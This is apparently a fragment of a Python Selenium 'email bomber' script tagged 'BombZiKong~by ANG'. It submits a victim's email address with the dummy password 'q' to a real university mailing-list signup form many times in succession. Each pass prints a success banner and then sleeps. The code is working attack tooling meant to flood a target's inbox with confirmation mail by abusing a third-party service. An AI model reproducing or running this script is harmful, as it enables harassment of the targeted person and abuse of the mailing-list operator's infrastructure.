confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
